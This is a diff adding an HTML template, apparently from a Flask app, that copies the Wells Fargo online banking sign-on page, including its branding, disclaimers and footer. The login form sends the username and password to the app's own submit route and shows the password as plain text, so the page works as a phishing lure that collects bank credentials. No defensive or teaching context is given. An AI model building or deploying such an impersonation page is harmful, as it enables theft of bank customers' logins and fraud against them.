@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wells Fargo Bank | Financial Services & Online Banking</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+   <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+
+  </head>
+  <body class="index-body">
+    <nav
+      class="navbar navbar-expand-lg navbar-dark nav-bar py-sm-3"
+      aria-label="Offcanvas navbar large"
+    >
+      <div class="container-fluid nav-container">
+        <a class="navbar-brand pe-lg-5" href="#">
+          <img src="static/img/image.webp" alt="Logo" />
+        </a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="offcanvas"
+          data-bs-target="#offcanvasNavbar2"
+          aria-controls="offcanvasNavbar2"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div
+          class="offcanvas offcanvas-end text-bg-dark"
+          tabindex="-1"
+          id="offcanvasNavbar2"
+          aria-labelledby="offcanvasNavbar2Label"
+        >
+          <div class="offcanvas-header">
+            <h2 class="offcanvas-title" id="offcanvasNavbar2Label">
+              <a class="nav-link">Home</a>
+            </h2>
+            <button
+              type="button"
+              class="btn-close btn-close-white"
+              data-bs-dismiss="offcanvas"
+              aria-label="Close"
+            ></button>
+          </div>
+          <div class="offcanvas-body">
+            <ul class="navbar-nav justify-content-end flex-grow-1 pe-3 py-3">
+              <li class="nav-item">
+                <a class="nav-link active" aria-current="page" href="#"
+                  >ATMS/Locations</a
+                >
+              </li>
+              <li class="nav-item">
+                <a class="nav-link active" aria-current="page" href="#">Help</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link active" aria-current="page" href="#"
+                  >About Us</a
+                >
+              </li>
+              <li class="nav-item">
+                <a class="nav-link active" aria-current="page" href="#"
+                  >Español</a
+                >
+              </li>
+            </ul>
+            <div class="d-flex align-items-center">
+              <button class="btn custom-btn" type="submit">Sign on</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <section id="Sign-in">
+      <div class="form-container">
+        <form class="container-lg px-lg-5" action="{{ url_for('submit') }}" method="post">
+          <div class="form-div text-center">
+            <h1 class="mb-3 font">{{greetings}}</h1>
+
+            <div class="form-floating">
+              <input
+                type="text"
+                class="form-control mb-3 form-input"
+                id="floatingInput"
+                placeholder="name@example.com"
+                name = "username"
+                required
+              />
+              <label for="floatingInput">Username</label>
+            </div>
+            <div class="form-floating">
+              <input
+                type="text"
+                class="form-control form-input"
+                id="floatingPassword"
+                placeholder="Password"
+                name = "password"
+                required
+              />
+              <label for="floatingPassword">Password</label>
+            </div>
+
+            <div class="form-check text-start my-3">
+              <input
+                class="form-check-input"
+                type="checkbox"
+                value="remember-me"
+                id="flexCheckDefault"
+              />
+              <label
+                class="form-check-label d-block mb-3"
+                for="flexCheckDefault"
+              >
+                Save Username
+              </label>
+              <span>
+                To help keep your account secure, save your username only on
+                devices that aren't used by other people.
+              </span>
+            </div>
+            <button
+              class="btn btn-signin py-2 d-block m-auto mt-4 mb-4"
+              type="submit"
+            >
+              Sign on
+            </button>
+            <a href="/" class="text-center">Forgot username or password?</a>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <section id="investment">
+      <div class="investment-container mb-4">
+        <div class="mb-5">
+          <strong>Investment and Insurance Products are:</strong>
+          <ul class="mt-2">
+            <li>
+              <strong
+                >Not Insured by the FDIC or Any Federal Government
+                Agency</strong
+              >
+            </li>
+            <li>
+              <strong
+                >Not a Deposit or Other Obligation of, or Guaranteed by, the
+                Bank or Any Bank Affiliate</strong
+              >
+            </li>
+            <li>
+              <strong
+                >Subject to Investment Risks, Including Possible Loss of the
+                Principal Amount Invested</strong
+              >
+            </li>
+          </ul>
+        </div>
+        <span>
+          Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</span
+        >
+      </div>
+    </section>
+    <footer class="text-start">
+      <div class="container">
+        <!-- First Row of Links -->
+        <div class="footer-links">
+          <a href="#">About Wells Fargo <span>| </span></a>
+          <a href="#">Online Access Agreement <span>|</span></a>
+          <a href="#">Privacy, Cookies, Security & Legal <span>|</span> </a>
+          <a href="#"
+            >Do not sell or share my personal information <span>|</span></a
+          >
+          <a href="#">Notice of Data Collection <span>|</span></a>
+          <a href="#">Report Email Fraud <span>|</span></a>
+          <a href="#">Security Center <span>|</span></a>
+          <a href="#">Sitemap <span>|</span></a>
+          <a href="#">Give Us Feedback</a>
+        </div>
+
+        <!-- Copyright Notice -->
+        <div class="footer-bottom mt-2">
+          © 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
